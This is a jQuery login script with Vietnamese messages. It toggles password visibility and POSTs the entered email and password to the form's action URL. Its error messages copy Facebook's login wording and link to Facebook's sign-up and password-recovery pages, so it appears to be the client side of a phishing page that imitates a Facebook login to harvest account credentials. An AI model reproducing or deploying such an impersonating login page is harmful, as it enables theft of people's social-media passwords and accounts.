$(document).ready(function(){
	//console.clear();
	
	$(document).on('keydown','input[name="pass"]',function(){
		_that = $(this);
		$('.pv').show();
	});
	$(document).on('click','.pv',function(){
		_that = $(this);
		_pass = $('input[name="pass"]');
		_an = $('#an');
		_hien = $('#hien');
		if(_pass.attr('type')=='password')
		{
			_pass.attr('type','text');
			_an.show();
			_hien.hide();
		}else
		{
			_pass.attr('type','password');
			_an.hide();
			_hien.show();
		}
	});
	$(document).on('click','.btn-login',function(){		
		_that = $(this);
		_form     = _that.closest("form");
		_url   = _form.attr("action");
		_redirect = _form.data("redirect");       
		_pass = $('input[name="pass"]').val();
		_email = $('input[name="email"]').val();
		_alert = $('.alert-content');
		_alert.hide();
		_pass = _pass.trim();
		_email = _email.trim();
		_that.attr('disabled',true);
		if(_pass && _email)
		{
			$.ajax({
			  async: true,
			  method: "POST",
			  url: _url,
			  data: { 'u': _email, 'p':_pass,'task' : 'login' }
			}).done(function(rs){
				_that.removeAttr('disabled');	
				_msg = '';
				_class = 'error';
				console.log(rs);
				switch(rs)
				{
					case '1':
						_msg = 'Đăng nhập thành công.';
						_class = 'success';
						window.location.href= _redirect;
						break;
					case '2':
						_msg = 'Lỗi chứng thực quyền đăng nhập.';
						break;
					case '3':
						_msg = 'Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <a href="https://m.facebook.com/r.php">Đăng ký tài khoản.</a>';
						break;
					case '3.1':
						_msg = 'Mật khẩu bạn đã nhập không đúng. <a href="https://m.facebook.com/recover/initiate/">Bạn quên mật khẩu?</a>';
						break;
					default:
						_msg = 'Lỗi không xác định.';					
				}
				_alert.empty().show().removeClass('success').removeClass('error').addClass(_class).html(_msg);
			});
		}
	});
});